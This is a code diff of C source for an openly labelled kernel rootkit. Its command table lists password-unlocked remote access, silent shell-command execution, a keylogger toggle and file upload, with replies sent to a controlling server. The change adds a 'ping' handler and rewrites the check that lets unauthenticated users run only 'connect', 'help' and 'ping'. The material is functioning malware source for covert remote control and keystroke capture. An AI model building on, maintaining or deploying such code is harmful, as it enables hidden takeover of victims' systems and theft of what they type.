@@ -19,6 +19,7 @@ extern struct socket *get_worker_socket(void);
 // Handler prototypes
 static int connect_handler(char *args);
 static int disconnect_handler(char *args);
+static int ping_handler(char *args);
 static int change_password_handler(char *args);
 static int exec_handler(char *args);
 static int klgon_handler(char *args);
@@ -39,6 +40,7 @@ static int upload_handler(char *args);
 static struct command rootkit_commands_array[] = {
     { "connect", 7, "unlock access to rootkit. Usage: connect [password]", 50, connect_handler },
     { "disconnect", 10, "disconnect user", 15, disconnect_handler },
+    { "ping", 4, "ping the rootkit", 16, ping_handler },
     { "passwd", 6, "change rootkit password. Usage: passwd NEW_PASSWORD", 60, change_password_handler },
     { "exec", 4, "execute a shell command. Usage: exec [-s for silent mode] [args*]", 65, exec_handler },
     { "klgon", 6, "activate keylogger", 20, klgon_handler },
@@ -94,10 +96,24 @@ int rootkit_command(char *command, unsigned command_size) {
         return -EINVAL;
     }
 
-    if (!is_user_auth() && strncmp(command, "connect", 7) != 0 && strncmp(command, "help", 4) != 0) {
-        send_to_server("You are not authentificated. See 'connect' command.\n");
-        ERR_MSG("rootkit_command: user not authenticated\n");
-        return -FAILURE;
+    // List of commands allowed without authentication
+    const char *allowed_commands[] = { "connect", "help", "ping", NULL };
+
+    // Ensure the user is authenticated before executing most commands
+    if (!is_user_auth()) {
+        int is_allowed = 0;
+        for (int i = 0; allowed_commands[i] != NULL; i++) {
+            if (strncmp(command, allowed_commands[i], strlen(allowed_commands[i])) == 0) {
+                is_allowed = 1;
+                break;
+            }
+        }
+
+        if (!is_allowed) {
+            send_to_server("Authentication required. Use the 'connect' command to authenticate.\n");
+            ERR_MSG("rootkit_command: user attempted to execute a command without authentication\n");
+            return -FAILURE;
+        }
     }
 
     int i;
@@ -168,6 +184,11 @@ static int disconnect_handler(char *args) {
     set_user_auth(false);
     send_to_server("User successfully disconnected.\n");
     return false;
+}
+
+static int ping_handler(char *args) {
+    send_to_server("pong\n");
+    return SUCCESS;
 }
 
 static int exec_handler(char *args) {
